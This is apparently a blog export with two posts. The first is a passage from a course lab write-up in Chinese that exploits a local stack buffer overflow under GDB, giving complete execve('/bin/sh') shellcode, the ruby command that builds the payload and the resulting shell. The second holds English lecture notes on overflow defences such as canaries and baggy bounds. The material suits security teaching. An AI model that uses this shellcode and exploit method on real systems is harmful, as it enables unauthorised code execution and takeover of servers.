0x401178(gdb) p/x $rax$1 = 0x7fffffffe3d0 # 根据0x401174这条指令，我们知道buffer地址存放在%rax寄存器中(gdb) 由上，我们知道buffer的起始地址是0x7fffffffe3d0，理论上来说，这个应该就是注入代码的起始地址了。有的同学可能会怀疑这个地址只是一个随机数，下次执行时就不一样了。这样的想法非常合理，然而，如果再多测试几次，我们会惊讶地发现，这个值还真是固定的，并不是随机分配的。这是因为，GDB默认会关闭stack randomization，也就是说，在不受其他外界因素影响的前提下，调试程序每次开始执行时的栈顶地址都是固定的，从而buffer的地址也不会变。我们可以通过show disable-randomization来查看GDB是否已关闭stack-randomization，也可以通过set disable-randomization on/off修改这一选项：12345(gdb) show disable-randomizationDisabling randomization of debuggee's virtual address space is on.(gdb) set disable-randomization off(gdb) set disable-randomization on(gdb) 好，现在我们有了恶意代码，也有了代码注入后的起始地址，接下来就是研究栈的结构，方便我们准确地修改到函数返回地址：12345678910111213141516171819# stack for foo function +----------------+ | ... | # main function's frame +----------------+ | return address | # 我们要修改的是这个位置 +----------------+ %rbp ----&gt; | saved %rbp | +----------------+ | buffer[63:56] | | buffer[55:48] | | buffer[47:40] | | buffer[39:32] | | buffer[31:24] | | buffer[23:16] | | buffer[15:8] | | buffer[7:0] | # 地址为0x7fffffffe3d0 | ... | %rsp ----&gt; | ... | +----------------+ 我们输入的数据将会从buffer[0]开始，一直往上填充，直至将return address字段修改。我们的实验主机为64位系统，可以计算出，我们需要至少先输入72字节的数据，才能开始修改return address字段，而我们希望将返回地址修改为0x7fffffffe3d0，所以，我们总共需要输入78字节的数据。下面，我们来构造输入数据。 首先，毋庸置疑，我们需要将恶意代码作为输入数据的一部分，这里我把它放在输入数据的最前方：12# 恶意代码总共50字节\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh 现在我们还22个字节才能达到72字节，而事实上，这22个字节的数据是不起作用的，因为程序执行完恶意代码后就会自动退出，所以这22个字节我们可以自己随便凑，但是注意别作死地选\x00、\x20这样的数，它们会终止代码的注入，这里我建议大家使用\x90，因为这在x86机器上是NOP指令的机器码，所以不管我们把\x90添加在什么位置(可以在恶意代码前，也可以在恶意代码中，只要不是一条指令中间–!)，都不会影响程序的正常执行。 通过添加\x90将数据填充到72字节后，我们就可以将地址0x7fffffffe3d0添加到输入数据的末尾：1\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh\x90...\x90\xd0\xe3\xff\xff\xff\x7f 这里千万要注意小端机与大端机的区别，这会影响到地址0x7fffffffe3d0的表示，在小端机里，它要通过\xd0\xe3\xff\xff\xff\x7f来表示。 我们将构造的输入数据保存到文件evil.bin中，方便以后使用。继续使用GDB调试，以evil.bin文件内容作为输入，运行目标程序，观察攻击是否生效：12345678910111213141516171819202122232425262728293130104006@hamsa:~/project3$ ruby -e 'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\xd0\xe3\xff\xff\xff\x7f"' &gt; evil.bin3130104006@hamsa:~/project3$ gdb -q victimReading symbols from /home/3130104006/project3/victim...done.(gdb) b fooBreakpoint 1 at 0x401170: file victim.c, line 6.(gdb) r `cat evil.bin`Starting program: /home/3130104006/project3/victim `cat evil.bin`## ...#B+ │0x401170 &lt;foo+12&gt; mov -0x48(%rbp),%rdx │ │0x401174 &lt;foo+16&gt; lea -0x40(%rbp),%rax │ │0x401178 &lt;foo+20&gt; mov %rdx,%rsi │ │0x40117b &lt;foo+23&gt; mov %rax,%rdi │&gt; │0x40117e &lt;foo+26&gt; callq 0x400320 │ &gt;│0x401183 &lt;foo+31&gt; leaveq # 程序暂时停在这里 │ │0x401184 &lt;foo+32&gt; retq │ │0x401185 &lt;main&gt; push %rbp │ │0x401186 &lt;main+1&gt; mov %rsp,%rbp │ │0x401189 &lt;main+4&gt; sub $0x10,%rsp │ │0x40118d &lt;main+8&gt; mov %edi,-0x4(%rbp) │ │0x401190 &lt;main+11&gt; mov %rsi,-0x10(%rbp) │ │0x401194 &lt;main+15&gt; mov -0x10(%rbp),%rax │ │0x401198 &lt;main+19&gt; add $0x8,%rax │ └─────────────────────────────────────────────────────────────────────────┘child process 20231 In: foo Line: 7 PC: 0x401183(gdb) x/2gx $rbp0x7fffffffe3c0: 0x9090909090909090 0x00007fffffffe3d0(gdb) 当程序执行完对strcpy的调用，停在0x401183处时，我们利用x命令查看栈数据，发现%rbp + 8存放的就是我们之前注入的返回地址0x7fffffffe3d0，这说明我们的注入步骤成功啦！于是，小明自信地敲下c键，满怀信心地期待着攻击的生效，结果让他一脸懵逼的一幕出现了：123456789101112131415161718192021222324# 程序跑飞了～～ ┌─────────────────────────────────────────────────────────────────────────┐ &gt;│0x7fffffffe3d2 (bad) │ │0x7fffffffe3d3 (bad) │ │0x7fffffffe3d4 (bad) │ │0x7fffffffe3d5 jg 0x7fffffffe3d7 │&gt; │0x7fffffffe3d7 add %al,(%rax) │ │0x7fffffffe3d9 add %al,(%rax) │ │0x7fffffffe3db add %al,(%rdx) │ │0x7fffffffe3dd add %al,(%rax) │ │0x7fffffffe3df add %al,(%rax) │ │0x7fffffffe3e1 add %al,(%rax) │ │0x7fffffffe3e3 add %al,(%rax) │ │0x7fffffffe3e5 add %al,(%rax) │ │0x7fffffffe3e7 add %al,0x40(%rbx,%rdx,1) │ │0x7fffffffe3eb add %al,(%rax) │ └─────────────────────────────────────────────────────────────────────────┘child process 21114 In: Line: ?? PC: 0x7fffffffe3d2(gdb) cContinuing.Program received signal SIGILL, Illegal instruction.0x00007fffffffe3d2 in ?? ()(gdb) Illegal instruction？为啥会这样呢？我们不是已经做好一切工作了嘛！有了恶意代码，也知道了恶意代码的起始地址，甚至还成功将函数的返回地址修改成了恶意代码的起始地址，按理来说，程序返回后就应该去执行我们的恶意代码呀。 然而，这是幻觉。我们可以看一下0x7fffffffe3d0附近的指令，是不是很奇怪，这根本不是我们设计的恶意代码呀！这时错误原因很明显了，0x7fffffffe3d0原来不是恶意代码的起始位置！ 这似乎有些矛盾。我们前面提到GDB有关闭stack randomization，那么程序的初始栈顶地址应该是不变的，从而buffer的地址也不应该变。但事实并不是这样，因为我们忽视了一个条件：不受其他外界因素的影响。这里出现的外界因素是什么呢？其实就是我们输入的数据自身，要知道我们把这些数据作为参数传给main函数时，它们是要被压入堆栈的，这会使得栈顶地址变得更小，从而buffer对应的地址也会更小，不再是原来的0x7fffffffe3d0了。我们需要重新获取正确的buffer地址，这次我们还是将evil.bin作为参数：12345678910111213141516# 获取正确的buffer地址 ┌─────────────────────────────────────────────────────────────────────────┐B+ │0x401170 &lt;foo+12&gt; mov -0x48(%rbp),%rdx │ │0x401174 &lt;foo+16&gt; lea -0x40(%rbp),%rax │ &gt;│0x401178 &lt;foo+20&gt; mov %rdx,%rsi # 程序暂时停在这里 │ │0x40117b &lt;foo+23&gt; mov %rax,%rdi │ │0x40117e &lt;foo+26&gt; callq 0x400320 │ │0x401183 &lt;foo+31&gt; leaveq │ │0x401184 &lt;foo+32&gt; retq │ │0x401185 &lt;main&gt; push %rbp │ │0x401186 &lt;main+1&gt; mov %rsp,%rbp │ └─────────────────────────────────────────────────────────────────────────┘child process 21854 In: foo Line: 6 PC: 0x401178(gdb) p/x $rax$1 = 0x7fffffffe380(gdb) 原来0x7fffffffe380才是真正的buffer地址，话不多说，赶紧修改evil.bin中的数据，将\xd0\xe3\xff\xff\xff\x7f换为\x80\xe3\xff\xff\xff\x7f，然后重新使用GDB观察攻击是否生效：1234567891011121314151617181920# 重新测试3130104006@hamsa:~/project3$ ruby -e 'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\x80\xe3\xff\xff\xff\x7f"' &gt; evil.bin3130104006@hamsa:~/project3$3130104006@hamsa:~/project3$ gdb victim -qReading symbols from /home/3130104006/project3/victim...done.(gdb) r `cat evil.bin`Starting program: /home/3130104006/project3/victim `cat evil.bin`warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffd000process 22411 is executing new program: /bin/dash$$ echo $0/bin/sh$$ uptime 10:33:04 up 5 days, 4:58, 13 users, load average: 0.00, 0.01, 0.05$$ exit[Inferior 1 (process 22411) exited normally](gdb) q3130104006@hamsa:~/project3$ 哇！这次是真正的成功了。我们看到，在利用evil.bin内的数据作为程序参数时，程序会自动执行/bin/sh，我们也能在这个shell中执行一些常用的Linux命令。这就是一次非常简单的buffer overflow攻击呀！ 可能有些同学看到这里，会觉得这个攻击好low啊，就跑了一个shell，又不是拿到了什么管理员密码啥的，并没有什么作用嘛。其实不然，跑出一个shell是一件很有意义的事！试想一下，假设某个网站有一个输入框，要求用户输入自己的账号，而聪明的你发现经过某些特别的手段(不一定是buffer overflow)，能够使网站后台程序接收到你的输入后跑出shell，此时你一定乐坏了。因为你能够通过输入命令查看到服务器的很多重要信息！注意，此时你的身份不一定是root，这取决于执行网站程序的用户身份，如果刚好是root在跑这个网站程序，那么恭喜你，你拥有了root的权限，这台服务器已经属于你了；如果不是，那也不要紧，起码这个服务器的一部分已经属于你。 Exploit Buffer Overflow without GDB 下面介绍一下，不用GDB怎么实现buffer overflow。// TODO 12345678910111213141516171819202122232425262728~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:26$ echo $0zsh~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:28$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:30$ ./victim `cat input.bin`$$ echo $0/bin/sh$$ ls -ltotal 2588-rw-r--r-- 1 hac hac 79 May 9 20:32 input.bin-rw-r--r-- 1 hac hac 49 May 8 10:48 shellcode.bin-rwxr-xr-x 1 hac hac 874196 May 9 20:17 sp-rw-r--r-- 1 hac hac 428 May 9 20:16 sp.c-rwxr-xr-x 1 hac hac 874200 May 9 20:35 test-rw-r--r-- 1 hac hac 169 May 9 20:35 test.c-rwxr-xr-x 1 hac hac 874202 May 9 20:39 victim-rw-r--r-- 1 hac hac 169 May 9 20:37 victim.c$$ exit~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:49$ Reference Smashing The Stack For Fun And Profit(非常详细的说明，也是MIT 6-858推荐的阅读材料) Lecture Homepage(仅学校内网可以访问)]]></content>
      <tags>
        <tag>Security</tag>
        <tag>Assembly</tag>
        <tag>Buffer Overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Buffer Overflow理论]]></title>
    <url>%2F2016%2F05%2F03%2FBuffer-Overflow%E7%90%86%E8%AE%BA%2F</url>
    <content type="text"><![CDATA[MIT OpencoursewareComputer System Security 6-858 IntroConsider the following simplified example code from a Web server.1234567int read_req() &#123; char buf[128]; int i; gets(buf); i = atoi(buf); return i;&#125; It’s dangerous because gets() has no bounds check. Thus, stack may be flushed by a long(more than 128 bytes) input sequence. Look as the architecture of stack in X86:1234567891011121314151617 +----------------+entry %ebp ----&gt; |.. prev frame ..| | | | | +----------------+entry %esp ----&gt; | return address | +----------------+new %ebp ----&gt; | saved %ebp | +----------------+ | i | +----------------+ | buf[127] | | ... | | buf[0] | +----------------+new %esp ----&gt; | ... | +----------------+ 12345678# read_req's code: push %ebp mov %esp -&gt; %ebp sub 168, %esp ... # program mov %ebp -&gt; %esp pop %ebp ret Since gets() has no bounds check, all data in stack might be overwrited by input sequence. Attackers can exploit this weakness and modify the return address of this function. The new return address may point to a uncharted area or even a malicious program. SolutionsStack Canaries1234567891011+------------+| ret addr |+------------+ ^| saved %ebp | |+------------+ || CANARY | | Overflow goes+------------+ | this way.| buf[127] | || ... | || buf[0] | |+------------+ Canary goes in front of return address on the stack, so that any overflow which rewrites the return address will also rewrite canary. Therefore, we can check canary before we ret from the function. Care that here we assume attackers can only rewrite the stack in a linear wayThat is to say, before rewriting ret addr, canary must be changed. Another important thing is that canary cannot be easily guessed by attackers. It is interesting that canary can use 0, CR, LF or -1, since these characters are terminated characters. When do canaries fail Overwrite function pointers before canary malloc() and free() 123456char *p, *q;p = malloc(1024);q = malloc(1024);strcpy(p, buf);free(q);free(p); Assume that p and q are nearby.Here is architecture of memory block: 123456789101112# Allocated block Free block +-----------+ +------------+ | | | size | | Data | +------------+ | | | ...empty | +-----------+ +------------+ | Size | | bkwd ptr | +-----------+ +------------+ | fwd ptr | +------------+ | size | +------------+ The buffer overrun in p(strcpy()) will overwrite the size value in q‘s memory block! When free() merges two adjacent free blocks, it needs to manipulate bkwd and fwd pointers, and pointer calculation uses size to determine where the free memory block structure lives! 12345p = get_free_block_struct(size);bck = p-&gt;bk;fwd = p-&gt;fd;fwd-&gt;bk = bck; // Writes memorybck-&gt;fd = fwd; // Writes memory By corrupting the size value, attackers can force free() to operate on a fake struct that resides in attacker-controlled memory and has attacker-controlled values for forward and backward pointers.reference Bounds Check Eletric fencesAlign each heap object with a guard page, and use page tables to ensure that accesses to the guard page cause a fault 1234567+----------+| Guard || | ^+----------+ | Overflows cause| Heap | | a page exception| obj | |+----------+ Eletric fences can’t protect the stack, and the memory overhead is too high to use in production systems. Fat pointerModify the pointer representation to include bounds information. Now, a pointer includes a memory address and bounds information about an object that lives in that memory region. 12345678910// Example: /* Regular 32-bit pointer */ +----------------+ | 4-byte address | +----------------+ /* Fat pointer */+-----------------+----------------+---------------------+| 4-byte obj_base | 4-byte obj_end | 4-byte curr_address |+-----------------+----------------+---------------------+ The program will be aborted if it dereferences a pointer whose address is outside of its own base-end range.However, it can be expensive to check all pointer dereferences; Also, fat pointers are incompatible with a lot of existing software. Baggy BoundsFor each alocated object, store how big the object is.There are 5 tricks in Baggy Bounds: Round up each allocation to a power of 2, and align the start of the allocation to that power of 2 Express each range limit as log2(alloc_size). For 32-bit pointers, only need 5 bits to express the possible ranges. Store limit info in a linear array: fast lookup with one byte per entry. Also, we can use virtual memory to allocate the array on-demand. Allocate memory at slot granularity(e.g. 16bytes): fewer array entries 1234567891011121314151617181920212223/* Memory Block */+-------+-------+-------+-------+| |+-------+-------+-------+-------+0 32 64 96 128a = malloc(28);+-------+-------+-------+-------+| a | |+-------+-------+-------+-------+0 32 64 96 128b = malloc(50);+-------+-------+-------+-------+| a | | b |+-------+-------+-------+-------+0 32 64 96 128c = malloc(20);+-------+-------+-------+-------+| a | c | b |+-------+-------+-------+-------+0 32 64 96 128 How we check the bounds: 12345678910111213141516171819202122232425262728293031 slot_size = 16; p = malloc(16); table[p/slot_size] = 4; p = malloc(32); table[p/slot_size] = 5;/* 2 slot are used */ table[p/slot_size + 1] = 5; // Care that p is not the base address of the allocated block. // C code p1 = p + i; // Bounds check size = 1 &lt;&lt; table[p &gt;&gt; log_of_slot_size]; /** For example * p = malloc(28); slot_size = 16; * So table[p/slot_size] = table[p/slot_size + 1] = 5; * table[p &gt;&gt; log_of_slot_size] = 5; * size = 1 &lt;&lt; 5 = 32 */ base = p &amp; ~(size - 1); /** For example * size = 32 = 00100000; size - 1 = 00011111; * Assume p1's value(memory address) = 13 = 00001101 * p &amp; ~(size - 1) = 00001101 &amp; 11100000 = 0 * Assume p1's value(memory address) = 39 = 00100111 * p &amp; ~(size - 1) = 00100111 &amp; 11100000 = 00100000 = 32 */ // check (p1 &gt;= base) &amp;&amp; ((p1 - base) &lt; size) or (p ^ p1) &gt;&gt; table[p &gt;&gt; log_of_slot_size] == 0 Use virtual memory system to prevent out-of-bound derefs: set most signifcant bit in an OOB pointer, and then mark pages in the upper half of the address space as inaccessible. So we don’t have to instrument pointer dereferences to prevent bad memory accesses. Below is an example(assume slot_size = 16)1234567891011121314151617181920212223char *p = malloc(44);// 64 bytes are allocated// 64 / slot_size = 4 bounds table entries// These entries are set to 6char *q = p + 60;// Access is ok!char *r = q + 16；// r is now at an offset of 60 + 16 = 76 from// p. This means 12 bytes beyond the end of p.// So baggy bounds will raise an error.char *s = q + 8;// s is now at an offset of 60 + 8 = 64 from// p. This means 4 bytes beyond the end of p,// which is less than half a slot away.// No error is raised, but the OOB high-order bit// is set in s, so that s cannot be dereferenced.char *t = s - 32;// t is now back inside the bounds,// so the OOB bit is cleared.]]></content>
      <tags>
        <tag>Security</tag>
        <tag>Assembly</tag>
        <tag>Buffer Overflow</tag>
      </tags>
  </entry>
</search>
